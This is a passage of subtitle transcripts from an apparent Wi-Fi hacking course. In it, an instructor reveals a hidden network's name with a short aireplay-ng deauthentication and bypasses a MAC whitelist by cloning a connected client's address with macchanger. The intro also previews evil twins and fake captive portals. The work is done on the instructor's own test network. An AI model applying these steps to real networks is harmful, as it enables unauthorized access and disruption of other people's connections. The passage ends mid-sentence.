Now, keep in mind, if you have mobile data, the phone will start trying to access the Internet through

107
00:07:59,660 --> 00:08:06,170
the mobile data, and that's nothing we can do about because that doesn't operate on the Wi-Fi frequencies.

108
00:08:06,290 --> 00:08:11,780
Now this will continue and the device will be completely disconnected until I exit this.

109
00:08:11,780 --> 00:08:17,180
So if I do control C here, control C here, and let's close Airodump as well.

110
00:08:18,020 --> 00:08:25,250
Give it a few seconds and let's turn off the Wi-Fi and turn it back on.

111
00:08:29,230 --> 00:08:30,250
And perfect.

112
00:08:30,280 --> 00:08:34,270
Now we got our connection back and we're good to go.

113
00:08:34,690 --> 00:08:37,090
So it's actually not that complex.

114
00:08:37,090 --> 00:08:37,960
If you think of it.

115
00:08:37,960 --> 00:08:44,410
All we had to do is basically d authenticate our client from the second network that it automatically

116
00:08:44,410 --> 00:08:45,280
connected to.

117
00:08:45,310 --> 00:08:50,170
So even if there are other networks that our target is automatically connecting to and we don't want

118
00:08:50,170 --> 00:08:54,700
them to do that, you'll just have to run another window and launch the attack against them.

119
00:08:54,820 --> 00:08:59,470
The only thing you want to keep in mind to do this, you need a wireless adapter that supports both

120
00:08:59,470 --> 00:09:02,950
bands, the five gigahertz and the 2.4GHz frequency.

121
00:09:02,950 --> 00:09:05,650
And you need something powerful and reliable.

122
00:09:05,650 --> 00:09:13,990
Right now I'm using the Z Security Realtek adapter that uses the Realtek RTL 8812O chipset.

123
00:09:13,990 --> 00:09:21,010
Anything with that chipset should really work, but sometimes the build quality could affect the reliability

124
00:09:21,010 --> 00:09:26,350
of the adapter, especially when you're putting it under so much stress as we're doing in here.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 3: Gaining Access

1
00:00:00,590 --> 00:00:04,190
Okay, now you're ready to start the gaining access section.

2
00:00:04,820 --> 00:00:10,220
As the name suggests in this section, you're going to learn how to gain access to different types of

3
00:00:10,220 --> 00:00:11,090
networks.

4
00:00:11,240 --> 00:00:17,480
Now, before we start talking about cracking WEP, WPA, wpa2 and all of that, we're going to talk

5
00:00:17,480 --> 00:00:23,210
about some security implementations that might prevent us from even starting an attack.

6
00:00:23,300 --> 00:00:26,280
So first of all, we're going to talk about hidden networks.

7
00:00:26,300 --> 00:00:31,580
You're going to learn how to discover their name and launch the other attacks, because if the network

8
00:00:31,580 --> 00:00:37,310
is not broadcasting its existence, then you won't even be able to discover it or run any of the attacks

9
00:00:37,310 --> 00:00:39,620
that you learned or that you're going to learn.

10
00:00:40,410 --> 00:00:45,900
Then we're going to talk about Mac filtering, because if the target is using Mac filtering, then you

11
00:00:45,900 --> 00:00:48,750
won't be able to connect to it even if you have the key.

12
00:00:48,780 --> 00:00:54,210
So we're going to talk about how to bypass Mac filtering, whether it's implemented, using a whitelist

13
00:00:54,210 --> 00:00:55,680
or a blacklist.

14
00:00:56,370 --> 00:01:02,520
Once done with that, you're going to move into the subsections of this course, which will cover captive

15
00:01:02,520 --> 00:01:08,820
portals, Web, WPA, Wpa2 and WPA Enterprise.

16
00:01:09,580 --> 00:01:14,920
In each of these sections, you're going to learn a number of new and advanced methods to gain access

17
00:01:14,920 --> 00:01:15,970
to these networks.

18
00:01:15,970 --> 00:01:21,910
And you'll also going to learn how to bypass some security implementations that might be implemented

19
00:01:21,910 --> 00:01:23,020
by the router.

20
00:01:24,330 --> 00:01:31,230
Throughout this section, you're going to learn how to create a fake access point manually without relying

21
00:01:31,230 --> 00:01:32,490
on any tools.

22
00:01:32,820 --> 00:01:38,580
So this will be really handy because you're going to understand how each component of a fake network

23
00:01:38,580 --> 00:01:43,650
works and how to use that to to run a number of attacks.

24
00:01:43,650 --> 00:01:50,190
So you're going to learn how to create a fake captive portal and gain access to networks similar to

25
00:01:50,190 --> 00:01:52,810
hotels, networks and airport networks.

26
00:01:52,830 --> 00:02:00,660
You'll also learn how to use this fake access point to create an evil twin to a WPA or a WPA to network

27
00:02:00,660 --> 00:02:07,320
and gain access to it without having to run a brute force attack or a wordlist attack.

28
00:02:08,470 --> 00:02:12,900
You'll also learn how to use this fake access point to become the man in the middle.

29
00:02:12,910 --> 00:02:18,730
So we're going to be covering each component that's used in a fake access point separately so that you

30
00:02:18,730 --> 00:02:23,860
understand how they work and you can use it to run all the attacks that I just said.

31
00:02:23,860 --> 00:02:28,690
Plus you'll be able to adapt it to run any other attack that you might think of.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,200 --> 00:00:06,410
Now one of the major obstacles that you might find while trying to gain access to a network is if the

2
00:00:06,410 --> 00:00:08,840
network does not broadcast its name.

3
00:00:08,840 --> 00:00:15,050
So if the network is hidden, if the network is hidden, then you won't be able to connect to the network,

4
00:00:15,050 --> 00:00:17,390
even if it does not use any password.

5
00:00:17,450 --> 00:00:22,670
And if it uses a password, then you won't be able to use the attacks that we're going to talk about

6
00:00:22,670 --> 00:00:23,960
in future lectures.

7
00:00:24,080 --> 00:00:29,720
So you literally won't be able to do anything until you know the name of the network.

8
00:00:30,140 --> 00:00:36,440
So just to show you an example here, I have my own network and I've set it to be hidden.

9
00:00:36,440 --> 00:00:40,070
So I checked this box which says Mask Ssid.

10
00:00:40,250 --> 00:00:42,590
Now, this could be called something else for you again.

11
00:00:42,590 --> 00:00:44,300
But for me, that's the name of it.

12
00:00:44,480 --> 00:00:46,610
And I've called the network test.

13
00:00:46,610 --> 00:00:52,250
AP So the network actually has a name, but it just doesn't broadcast the name in the air.

14
00:00:52,850 --> 00:00:59,180
I've also set the network to not to use any security so people can connect as long as they know the

15
00:00:59,180 --> 00:01:00,290
network name.

16
00:01:00,290 --> 00:01:03,950
So if we go here on the Windows machine, I just want to show you an example.

17
00:01:03,950 --> 00:01:09,890
If we go on Wi-Fi networks, you'll see that there is a hidden network around us.

18
00:01:10,640 --> 00:01:16,850
But if we try to connect to this hidden network, if I click on it and click on Connect, the first

19
00:01:16,850 --> 00:01:21,050
thing that it's going to ask me is to enter the name of the network.

20
00:01:21,080 --> 00:01:26,930
Therefore, we can't actually connect to it if we don't know its name and if the network is using encryption.

21
00:01:26,930 --> 00:01:32,510
So if it's using a password for the network, then we won't be able to launch the Kraken attacks if

22
00:01:32,510 --> 00:01:33,620
we don't know the name.

23
00:01:33,620 --> 00:01:39,740
So if your target network is hidden, the first step is always to try and determine the name of that

24
00:01:39,740 --> 00:01:45,650
network, regardless of whether it uses encryption, if it uses a password or if it does not use a password.

25
00:01:45,830 --> 00:01:51,320
So in this lecture, I'm going to cover how to determine the name of hidden networks and how to connect

26
00:01:51,320 --> 00:01:52,250
to the network.

27
00:01:52,610 --> 00:01:58,310
Now I'm going to go to my Kali machine and I'm going to run Airodump NG on my wireless card in monitor

28
00:01:58,310 --> 00:01:58,640
mode.

29
00:01:58,640 --> 00:01:59,780
So we did this before.

30
00:01:59,780 --> 00:02:04,640
All I do is airodump ng and then I put the name of the wireless card, which is Monzo.

31
00:02:07,280 --> 00:02:12,890
And if I hit enter, as you can see, I can see all my networks around me and we can see the hidden

32
00:02:12,890 --> 00:02:13,790
network around us.

33
00:02:13,790 --> 00:02:17,510
And the hidden network is actually this one.

34
00:02:17,780 --> 00:02:23,570
So you can see that we can actually get all the information of that network so we can get its Mac address,

35
00:02:23,570 --> 00:02:27,440
we can see its distance, we can see the beacons, we can see the data.

36
00:02:27,440 --> 00:02:30,620
If there was a lot of data sent, we can see the encryption.

37
00:02:30,620 --> 00:02:31,970
So in our case, it's open.

38
00:02:31,970 --> 00:02:33,110
It's not using encryption.

39
00:02:33,110 --> 00:02:38,330
But if it was using encryption, then you'll see it uses WEP or WPA or whatever it's using.

40
00:02:38,810 --> 00:02:41,720
The only thing that's hidden is the name of the network.

41
00:02:41,720 --> 00:02:45,410
So you can see in here we actually don't have the name of the network.

42
00:02:45,970 --> 00:02:51,580
So basically, when a network is configured to be hidden, it only hides the network name, but it's

43
00:02:51,580 --> 00:02:54,240
still broadcasting its existence.

44
00:02:54,250 --> 00:02:57,370
It's still telling all the devices around it that I exist.

45
00:02:57,400 --> 00:03:02,140
My Mac address is this, my channel is this, and it's given all the information except the name.

46
00:03:02,140 --> 00:03:05,890
And basically what it's saying is, if you know my name, then you can connect to me.

47
00:03:07,220 --> 00:03:13,190
So what we're going to do now is we're going to run airodump ng against this specific network because

48
00:03:13,190 --> 00:03:14,360
that's our target.

49
00:03:14,360 --> 00:03:18,560
And we've done this in previous lectures again, but I'm just going to do it real quick here.

50
00:03:18,560 --> 00:03:22,250
So I'm going to copy its Mac address and I'm going to run Airodump ng.

51
00:03:24,590 --> 00:03:29,210
And I'm going to specify the ID of the target network, which is the Mac address.

52
00:03:31,910 --> 00:03:36,050
And then I'm going to specify the channel, which is six for this target network.

53
00:03:38,820 --> 00:03:42,870
And then I'm going to give it my wireless card in monitor mode, which is on zero.

54
00:03:44,010 --> 00:03:45,450
So again, we ran this command.

55
00:03:45,450 --> 00:03:50,700
A lot of times it's airodump NG we're giving it the Mac address of the target network and then we're

56
00:03:50,700 --> 00:03:56,040
giving it the channel, which is six, and then we give it the wireless card name in monitor mode.

57
00:03:56,130 --> 00:04:02,010
I'm going to hit enter and you can see now Airodump NG is running against this specific network.

58
00:04:02,160 --> 00:04:07,680
Now, in many cases, if the target network is a bit active, you'll actually be able to get the name

59
00:04:07,680 --> 00:04:10,920
of it simply by running airodump ng against it.

60
00:04:11,130 --> 00:04:17,070
In our case, we can see that the network is not active, so Airodump NG is not able to determine its

61
00:04:17,070 --> 00:04:17,610
name.

62
00:04:19,610 --> 00:04:24,860
But what we can also see is we can see that there is a client connected to the network right here because

63
00:04:24,860 --> 00:04:30,230
we said the second section of Airodump NG show us the connected devices so we can see that there is

64
00:04:30,230 --> 00:04:35,180
a device connected to this network and the device has this Mac address.

65
00:04:36,430 --> 00:04:41,800
So what we're going to do now is we're going to use a deauthentication attack like we did it before,

66
00:04:41,800 --> 00:04:45,040
and we're going to disconnect this device from this network.

67
00:04:45,340 --> 00:04:50,650
But the difference is we're actually going to disconnect it for a very short period of time so that

68
00:04:50,650 --> 00:04:53,860
it automatically reconnects to the target network.

69
00:04:53,860 --> 00:04:57,850
And when it does that, it's going to send the network name in the air.

70
00:04:58,090 --> 00:05:04,420
Since we have Airodump engines running, it will be able to capture that name and it will show it to

71
00:05:04,420 --> 00:05:07,270
us here and then we'll know the name of the network.

72
00:05:07,540 --> 00:05:09,820
So again, the attack is going to be very simple.

73
00:05:09,850 --> 00:05:15,280
All we're going to do is we're going to do a authentication attack for a very short period of time that's

74
00:05:15,280 --> 00:05:18,910
going to disconnect the target device for a split second.

75
00:05:18,910 --> 00:05:20,260
So they won't even feel it.

76
00:05:20,260 --> 00:05:23,950
And the operating system will automatically connect back to the network.

77
00:05:23,950 --> 00:05:28,420
When it does that, it's going to send the network name in the air and we're sniffing on that channel.

78
00:05:28,420 --> 00:05:31,870
So we'll be able to capture that name and we'll know the network name.

79
00:05:32,200 --> 00:05:34,150
So I'm going to split the screen.

80
00:05:35,260 --> 00:05:37,390
And we've actually run this attack before.

81
00:05:37,390 --> 00:05:41,650
So I'm just going to do it here again and it'll be a chance for you to revise it.

82
00:05:41,650 --> 00:05:43,000
So we're going to do a replay.

83
00:05:45,840 --> 00:05:46,560
The earth.

84
00:05:48,440 --> 00:05:53,240
And then we're going to put the Mac address of the target network after the argument.

85
00:05:55,470 --> 00:06:01,770
And then I'm going to do minus C, and then I'll give the Mac address of the client that I want to disconnect.

86
00:06:01,770 --> 00:06:03,210
And it's this one right here.

87
00:06:08,030 --> 00:06:13,700
And finally, I'm going to put the name of the wireless card in monitor mode, which is one zero.

88
00:06:15,510 --> 00:06:20,880
Now, I actually forgot to specify the number of the authentication packets to send.

89
00:06:21,000 --> 00:06:27,300
In the previous videos, we actually used a really big number in here so that we can keep the target

90
00:06:27,300 --> 00:06:30,580
computer disconnected for as long as possible.

91
00:06:30,600 --> 00:06:34,380
In this video we actually want them to be disconnected for a split second.

92
00:06:34,380 --> 00:06:36,480
So I'm going to use four packets.

93
00:06:36,930 --> 00:06:41,460
Usually two is sufficient, but I'm just going to use four just to make sure that the target device

94
00:06:41,460 --> 00:06:42,680
will get disconnected.

95
00:06:42,690 --> 00:06:48,300
So it will because we're using a very small number, it will be disconnected for a very short period

96
00:06:48,300 --> 00:06:48,900
of time.

97
00:06:48,900 --> 00:06:52,770
And the target person who is using that network will not even feel that.

98
00:06:53,130 --> 00:06:57,030
So the same command that we did before, nothing's different aeroplane engine.

99
00:06:57,210 --> 00:07:02,910
We're doing a D authentication attack and we're using a very small number of packets because we don't

100
00:07:02,910 --> 00:07:06,300
want the target person to feel that they got disconnected.

101
00:07:06,330 --> 00:07:13,350
We gave the Mac address of the target network after the A option and then we gave the Mac address of

102
00:07:13,350 --> 00:07:17,890
the client that we want to disconnect after the C option, I'm going to hit enter.

103
00:07:21,040 --> 00:07:26,860
And as you can see, nearly after sending two packets, we were able to determine the name of the network.

104
00:07:26,860 --> 00:07:31,810
So right here in Airodump NG, it's telling us that the name of the network is Test AP.

105
00:07:32,440 --> 00:07:38,310
And now if the network is open, like in our case, we can just go ahead and connect to that network.

106
00:07:38,320 --> 00:07:44,200
Or if the network is using encryption like WEP, WPA or WPA two, then we actually know the name of

107
00:07:44,200 --> 00:07:49,960
the network now and you'll be able to launch the attacks that you're going to learn in the next lectures

108
00:07:49,960 --> 00:07:52,600
against that network and then determine its key.

109
00:07:53,750 --> 00:07:55,970
So the attack was very simple.

110
00:07:55,970 --> 00:08:02,330
All we had to do is run airodump ng against our specific target network and then authenticate one of

111
00:08:02,330 --> 00:08:07,310
the clients for a very short period of time and they'll automatically get connected to the network.

112
00:08:07,310 --> 00:08:10,070
When they do that, we'll know the network name.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,800 --> 00:00:06,110
Now let me show you how to connect to a hidden network, because the process is a bit different than

2
00:00:06,110 --> 00:00:07,700
connecting to a normal network.

3
00:00:07,730 --> 00:00:13,330
The main thing is, since I was using Airodump NG, I put my wireless card in monitor mode.

4
00:00:13,340 --> 00:00:19,250
So if I go and try to connect, nothing's going to happen and I won't even be able to discover networks

5
00:00:19,250 --> 00:00:24,290
because as we said before, you can't connect to networks when you're in monitor mode.

6
00:00:24,320 --> 00:00:31,760
Monitor mode is only used if we wanted to capture packets that are not even sent to us, so it can't

7
00:00:31,760 --> 00:00:34,310
associate with one specific network.

8
00:00:35,590 --> 00:00:40,900
So to connect to a network, you need to be in managed mode, which is the default mode.

9
00:00:40,930 --> 00:00:46,240
So you can put your card back in managed mode by doing Airman ng, Stop.

10
00:00:49,790 --> 00:00:51,710
And then you put the wireless card name.

11
00:00:51,710 --> 00:00:57,140
So if you started it using the first method or the third method, you're going to do LAN zero, mon.

12
00:00:59,230 --> 00:01:07,150
Or in my case, I started monitor mode using the second method, so I'm going to have to do iwconfig.

13
00:01:07,810 --> 00:01:09,070
Mon zero.

14
00:01:10,120 --> 00:01:11,170
Mode managed.

15
00:01:13,740 --> 00:01:16,710
Of course, in both of these cases, you have to bring the car down.

16
00:01:16,740 --> 00:01:19,410
Do that and then bring the card up.

17
00:01:20,960 --> 00:01:26,720
Now an easier way to do this and just to avoid all confusion, regardless of the way that you enabled

18
00:01:26,720 --> 00:01:30,020
monitor mode, all you have to do is just disconnect the card.

19
00:01:30,020 --> 00:01:31,010
So that's what I'm going to do.

20
00:01:31,040 --> 00:01:34,970
Physically disconnect my wireless card and then reconnect it back.

21
00:01:36,090 --> 00:01:37,230
Now when you do this.

22
00:01:37,260 --> 00:01:38,550
If I do if config.

23
00:01:39,730 --> 00:01:42,130
You won't even see the wireless card in here.

24
00:01:42,130 --> 00:01:44,800
So we have to go back to the devices menu.

25
00:01:46,200 --> 00:01:48,540
USB and attach the wireless card.

26
00:01:48,540 --> 00:01:50,640
And for me it's called Atheros right here.

27
00:01:51,030 --> 00:01:54,630
So if I do that, that's going to connect my card again.

28
00:01:54,630 --> 00:01:56,100
So if I do ifconfig.

29
00:01:57,400 --> 00:01:59,590
You'll see that I have my line zero.

30
00:01:59,590 --> 00:02:01,780
And if I do iwconfig.

31
00:02:03,600 --> 00:02:07,410
You'll see that my line zero is back into managed mode.

32
00:02:07,620 --> 00:02:11,970
So it's in the default mode and I can use it to connect to networks.

33
00:02:12,060 --> 00:02:16,870
Now to connect to a hidden network, we're going to go to settings.

34
00:02:16,870 --> 00:02:20,640
So I'm going to click on all applications and I'm going to go to settings.

35
00:02:21,570 --> 00:02:23,520
And I'm going to go on network.

36
00:02:23,940 --> 00:02:29,910
Now, if you actually if you enabled monitor mode using the third method, if you go on networks, you

37
00:02:29,910 --> 00:02:30,690
won't see anything.

38
00:02:30,690 --> 00:02:33,630
Again, it's going to say that your network manager is off.

39
00:02:33,630 --> 00:02:36,090
So if it looks like this, that's fine.

40
00:02:36,090 --> 00:02:42,060
If it doesn't look like this, then go back to your terminal and run or start the network manager again.

41
00:02:42,060 --> 00:02:47,220
Because when you do Airman NG, check kill, that kills the network manager.

42
00:02:47,220 --> 00:02:49,680
So just do service.

43
00:02:50,360 --> 00:02:51,710
Network manager.

44
00:02:54,500 --> 00:02:57,180
And that will start the network manager for you.

45
00:02:57,200 --> 00:02:58,360
Come back here.

46
00:02:58,370 --> 00:02:59,690
It should look like this.

47
00:02:59,690 --> 00:03:02,600
And if it's looking like this, then everything is perfect.

48
00:03:02,630 --> 00:03:07,940
Now, since we want to connect to a hidden network, you won't see the network that you want to connect

49
00:03:07,940 --> 00:03:08,360
in here.

50
00:03:08,360 --> 00:03:11,450
So you can see that I don't have my target network in here.

51
00:03:12,990 --> 00:03:20,430
So I'm going to go on Kinect to a hidden network, and then it's going to ask me for the network name.

52
00:03:20,430 --> 00:03:23,040
So I'm going to put test AP like we seen.

53
00:03:27,460 --> 00:03:30,490
Cousin here if we go back to the result of Airodump ng.

54
00:03:32,850 --> 00:03:36,030
You'll see that the name of the network was Test AP.

55
00:03:37,560 --> 00:03:41,010
Then it's going to ask me to put the security of the network.

56
00:03:41,010 --> 00:03:47,190
So again, if the network is using WEP or WPA or WPA two, then you can specify it from here.

57
00:03:47,190 --> 00:03:50,040
In my case, it's not using anything, so it's set to none.

58
00:03:50,040 --> 00:03:51,570
So I'm just going to connect.

59
00:03:53,360 --> 00:03:56,360
And as you can see, I managed to connect to the network.

60
00:03:56,390 --> 00:04:00,200
If we go on the settings now, this network actually does not have Internet connection.

61
00:04:00,200 --> 00:04:02,630
That's why there was very low data going in.

62
00:04:02,630 --> 00:04:05,540
But as you can see, I'm connected to the network.

63
00:04:05,540 --> 00:04:12,950
I have a good signal strength, I've got an IP address and I have the IP address of the default gateway

64
00:04:12,950 --> 00:04:18,050
and I can do anything I want now on the network because I'm fully connected to it.

65
00:04:19,170 --> 00:04:24,600
So when it comes to connecting to a network, you need to keep in mind that your wireless card has to

66
00:04:24,600 --> 00:04:26,880
be in managed mode, not in monitor mode.

67
00:04:26,910 --> 00:04:29,010
There is a number of ways to do that.

68
00:04:29,040 --> 00:04:35,550
The easiest one is just to physically disconnect the card, connect it back and then look for the networks.

69
00:04:35,580 --> 00:04:41,250
If you go and look for networks and it tells you that the network manager is down, if it's off, then

70
00:04:41,250 --> 00:04:46,710
all you have to do is just run service, network manager start and that will start the network manager

71
00:04:46,710 --> 00:04:47,340
for you.

72
00:04:47,370 --> 00:04:52,680
Then you can come back, connect to a hidden network, put the network name, and then you'll be able

73
00:04:52,680 --> 00:04:53,400
to connect.

74
00:04:54,160 --> 00:05:00,130
As I said, hidden networks can make a major obstacle because if the network is open, you won't be

75
00:05:00,130 --> 00:05:01,060
able to connect.

76
00:05:01,060 --> 00:05:05,620
If the network is using a password, then you can't even start doing the attacks that we're going to

77
00:05:05,620 --> 00:05:08,450
talk about until you know the name of the network.

78
00:05:08,470 --> 00:05:12,640
So your first step is always you need to know the name of the network.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,260 --> 00:00:06,230
Another thing that might prevent you from connecting to the target network, even if it's an open network

2
00:00:06,230 --> 00:00:11,780
or if, you know, the key to that network is if the network uses Mac filtering.

3
00:00:11,870 --> 00:00:19,670
Mac filtering is a way to allow or prevent devices from connecting to the network based on their Mac

4
00:00:19,670 --> 00:00:20,390
address.

5
00:00:20,930 --> 00:00:24,050
Mac filtering can be implemented in two ways.

6
00:00:24,080 --> 00:00:31,130
The first method is using a blacklist, so the network will prevent any device that's listed in that

7
00:00:31,130 --> 00:00:36,140
blacklist from connecting to the network, but allow everybody to connect to it.

8
00:00:36,500 --> 00:00:42,680
This can be easily bypassed by changing your Mac address to a random Mac address and then you'll be

9
00:00:42,710 --> 00:00:44,510
able to connect to the network.

10
00:00:45,260 --> 00:00:50,810
The second method, which is the trickier one, is if the network uses a whitelist.

11
00:00:50,840 --> 00:00:56,690
This is the opposite of a blacklist, so the network will prevent everybody from connecting to the network,

12
00:00:56,690 --> 00:01:02,850
even if the network is open, and it will only allow the devices listed in that whitelist.

13
00:01:02,850 --> 00:01:09,030
So changing your Mac address to a random Mac address will not allow you to connect because the network

14
00:01:09,030 --> 00:01:12,420
only allows specific devices to connect to it.

15
00:01:12,900 --> 00:01:18,060
Now, in this video, I'm going to show you how to bypass white lists, because black lists are really

16
00:01:18,060 --> 00:01:22,320
easy and all you have to do is just change your Mac address to a random one, like I said, and you'll

17
00:01:22,320 --> 00:01:23,700
be able to bypass it.

18
00:01:24,710 --> 00:01:25,220
Right here.

19
00:01:25,220 --> 00:01:28,430
I have my router and it's not hidden anymore.

20
00:01:28,430 --> 00:01:29,990
So it's broadcasting its name.

21
00:01:29,990 --> 00:01:31,040
It's called Test AP.

22
00:01:31,280 --> 00:01:32,960
It's not using any encryption.

23
00:01:32,960 --> 00:01:37,970
But again, Mac filtering can be used with hidden networks and it can be used with encryption.

24
00:01:37,970 --> 00:01:44,000
Bypassing it is the same though, so we can bypass it using Mac changer regardless of whether the network

25
00:01:44,000 --> 00:01:48,050
is hidden or not and regardless of the encryption used on the network.

26
00:01:48,650 --> 00:01:55,670
So I have the network to none not using any encryption and I'm using a whitelist and I only added the

27
00:01:55,670 --> 00:01:58,400
Mac address for this specific Mac machine.

28
00:01:58,400 --> 00:02:01,400
So any other machine cannot connect to this network.

29
00:02:01,400 --> 00:02:04,160
Only computers that have the Mac address.

30
00:02:04,160 --> 00:02:05,840
This Mac address can connect.

31
00:02:05,840 --> 00:02:09,740
And my Mac computer right here has this Mac address.

32
00:02:09,740 --> 00:02:14,330
That's why if I go on Wi-Fi here, you'll see that it's connected to test AP.

33
00:02:15,240 --> 00:02:17,310
So if I go to the windows machine.

34
00:02:18,540 --> 00:02:20,910
And try to connect to the network now.

35
00:02:21,060 --> 00:02:22,760
As I said, it's an open network.

36
00:02:22,770 --> 00:02:23,590
As you can see here.

37
00:02:23,590 --> 00:02:25,620
It doesn't require any passwords or anything.

38
00:02:25,620 --> 00:02:30,360
All you have to do is just click it and connect to it, and we should be able to connect.

39
00:02:30,600 --> 00:02:35,940
But in this case, because the target network is using Mac filtering, you'll see that the the Windows

40
00:02:35,940 --> 00:02:38,010
machine will literally just get stuck at this.

41
00:02:38,010 --> 00:02:41,130
And then it tells us that it can't connect to this network.

42
00:02:42,200 --> 00:02:48,980
So to bypass this, we're going to first of all, run airodump ng against all networks around us just

43
00:02:48,980 --> 00:02:50,720
to see information about them.

44
00:02:53,680 --> 00:02:58,090
And I'm doing it real quick here because we've done this a lot by now, so I'm just doing airodump ng

45
00:02:58,210 --> 00:03:01,030
one zero to list all the networks around me.

46
00:03:01,030 --> 00:03:04,960
And of course Mode zero is my wireless card in monitor mode.

47
00:03:06,160 --> 00:03:10,450
And as you can see here, I can see my target network, which is called Test App.

48
00:03:10,660 --> 00:03:14,260
It's an open network and we can see its Mac address.

49
00:03:15,070 --> 00:03:21,400
The next step is going to be for me to run airodump ng against this specific network so we can get more

50
00:03:21,400 --> 00:03:25,160
information about it and see if there is any clients connected to it.

51
00:03:25,180 --> 00:03:29,620
So again, we did this a lot by now, so I'm going to do it a little bit quickly.

52
00:03:29,620 --> 00:03:30,880
I'm going to do Airodump ng.

53
00:03:33,300 --> 00:03:35,910
I'm going to specify the bssid.

54
00:03:35,940 --> 00:03:37,920
The Mac address of the target network.

55
00:03:41,560 --> 00:03:43,630
And I'm going to specify the channel.

56
00:03:47,030 --> 00:03:49,490
And the target network is running on six.

57
00:03:50,820 --> 00:03:55,890
And then I'm going to specify the name of the wireless card in monitor mode, and it's called Mode zero

58
00:03:55,890 --> 00:03:56,520
for me.

59
00:03:58,690 --> 00:04:01,000
And I misspelled side here.

60
00:04:01,000 --> 00:04:01,930
There should be no E.

61
00:04:04,330 --> 00:04:07,620
And as you can see now, we're running against this network only.

62
00:04:07,630 --> 00:04:12,110
And what we're going to do is we're going to wait for someone to connect to this network.

63
00:04:12,130 --> 00:04:16,420
Now, we know that the Mac machine is already connected, so this just might take a few seconds for

64
00:04:16,420 --> 00:04:17,290
it to show up.

65
00:04:18,780 --> 00:04:21,900
And as you can see here, we see the Mac machine.

66
00:04:21,930 --> 00:04:27,870
We can see that we have a client connected because, as we said, the second part of Airodump NG shows

67
00:04:27,870 --> 00:04:29,280
the connected client.

68
00:04:29,580 --> 00:04:36,180
And because this client right here is connected to the network, that means that this network is allowing

69
00:04:36,180 --> 00:04:37,590
this client to connect to it.

70
00:04:37,590 --> 00:04:42,240
So the Mac address of this client must be included in the whitelist.

71
00:04:42,750 --> 00:04:48,870
So for us now, if we wanted to connect to that network, all we have to do is change our Mac address

72
00:04:48,870 --> 00:04:50,820
to this specific Mac address.

73
00:04:50,820 --> 00:04:56,490
And once we do that, we'll be able to connect to the network because our Mac address is going to be

74
00:04:56,490 --> 00:04:58,200
listed in the whitelist.

75
00:04:58,950 --> 00:05:01,230
So I'm going to copy this.

76
00:05:01,800 --> 00:05:04,200
And what I'm going to do next is very simple.

77
00:05:04,200 --> 00:05:05,160
We've done it before.

78
00:05:05,160 --> 00:05:07,530
All I'm going to do is I'm going to use Mac Changer.

79
00:05:07,530 --> 00:05:13,140
I'm going to change my Mac address to the Mac address of this computer, to the Mac address of the OSX

80
00:05:13,140 --> 00:05:13,830
machine.

81
00:05:13,830 --> 00:05:18,820
And because I'm going to do this, the network is going to allow me to connect because it's going to

82
00:05:18,820 --> 00:05:24,070
think that my wireless card is actually the wireless card that's the Mac machine is using.

83
00:05:24,070 --> 00:05:27,190
So it's going to think that I'm allowed to connect to that network.

84
00:05:27,370 --> 00:05:33,790
So I'm going to stop Airodump NG and I'm going to have to put my wireless card in managed mode.

85
00:05:33,790 --> 00:05:38,890
And as I said in previous lectures, this is different depending on the way that you enabled monitor

86
00:05:38,890 --> 00:05:39,400
mode.

87
00:05:39,430 --> 00:05:45,820
The simplest way to do that is just to physically disconnect my card and then reconnect it back.

88
00:05:46,280 --> 00:05:54,700
Now I'm going to have to go to the device's USB and attach the device from here.

89
00:05:54,710 --> 00:05:56,690
And my device is called Atheros.

90
00:05:58,230 --> 00:06:02,460
And if I do ifconfig, I can see my device connected.

91
00:06:02,460 --> 00:06:03,900
Now it's called lan zero.

92
00:06:04,050 --> 00:06:08,070
So now we're just going to change the Mac address that we like we did before.

93
00:06:08,070 --> 00:06:10,680
And again, this is going to be a chance for you to revise it.

94
00:06:10,860 --> 00:06:13,260
So I'm going to put the wireless card down.

95
00:06:16,940 --> 00:06:20,060
Then I'm going to use Mac Changer to change the Mac address.

96
00:06:20,060 --> 00:06:21,680
So we're going to do Mac Changer.

97
00:06:23,810 --> 00:06:30,320
And in the previous video we actually used the minus R argument just to get a random Mac address.

98
00:06:30,320 --> 00:06:36,410
But in this video we want to use a specific Mac address, which is the Mac address of the client that's

99
00:06:36,410 --> 00:06:37,910
connected to that network.

100
00:06:37,910 --> 00:06:44,630
So I'm just going to use that with the minus M argument to tell Mac Changer that I just want this specific

101
00:06:44,630 --> 00:06:45,560
Mac address.

102
00:06:47,030 --> 00:06:50,000
And then I'm going to give the wireless card name that I want to change.

103
00:06:50,000 --> 00:06:50,540
It's Mac.

104
00:06:50,540 --> 00:06:52,670
And for me, it's called nine zero.

105
00:06:53,690 --> 00:06:56,180
Remember, the wireless card now is in managed mode.

106
00:06:56,180 --> 00:06:57,710
It's not in monitor mode.

107
00:06:58,070 --> 00:07:00,050
So we did this command before.

108
00:07:00,050 --> 00:07:00,770
It's very simple.

109
00:07:00,770 --> 00:07:04,610
We're doing Mac Changer, which is the program that changes the Mac address for us.

110
00:07:04,640 --> 00:07:10,610
We're telling it that I want to use a specific Mac and this is the specific Mac that I want to use,

111
00:07:10,640 --> 00:07:15,140
and then I'm giving it the name of my wireless card I'm going to hit Enter.

112
00:07:16,660 --> 00:07:22,090
Now, this error shouldn't happen, so I'm just going to try to do ifconfig lan zero down again.

113
00:07:23,450 --> 00:07:27,020
And then set up the Mac address to the new one.

114
00:07:28,610 --> 00:07:33,770
And as you can see now, the Mac address changed to the one that I want to use, the one that's allowed

115
00:07:33,770 --> 00:07:35,330
to connect to the network.

116
00:07:35,570 --> 00:07:40,080
And now if we go and try to connect to the network, we should be able to do that.

117
00:07:40,100 --> 00:07:44,480
So I'm going to go to my network manager.

118
00:07:50,070 --> 00:07:52,620
And we can see that test AP is here.

119
00:07:52,860 --> 00:07:54,450
It's trying to connect.

120
00:07:56,140 --> 00:07:57,880
And we managed to connect.

121
00:07:58,060 --> 00:08:02,590
And if we look at the settings again, we can see that we're getting a good signal.

122
00:08:02,590 --> 00:08:07,170
We have an IP address and we know the IP address of the gateway.

123
00:08:07,180 --> 00:08:12,250
So we basically have full access to the network and we can use it just like any other device.

124
00:08:12,960 --> 00:08:20,040
So the main idea to take from this is if you if the target network does not use a password or if the

125
